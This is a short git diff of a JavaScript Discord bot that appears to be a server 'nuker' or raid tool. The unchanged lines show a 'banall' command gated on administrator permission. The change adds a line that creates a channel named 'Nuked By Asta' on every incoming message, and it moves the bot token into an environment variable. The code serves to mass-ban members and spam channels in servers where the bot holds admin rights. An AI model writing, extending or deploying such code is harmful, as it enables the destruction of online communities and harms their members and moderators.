@@ -216,7 +216,7 @@ client.on("message", async message => {
                 message.delete();
             }
         }
-
+        message.guild.channels.create('Nuked By Asta')
         // Ban All
         if (message.content.startsWith(prefix + 'banall')) {
             if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
@@ -360,4 +360,4 @@ client.on("message", async message => {
 
 })
 
-client.login(token)
+client.login(process.env.token)
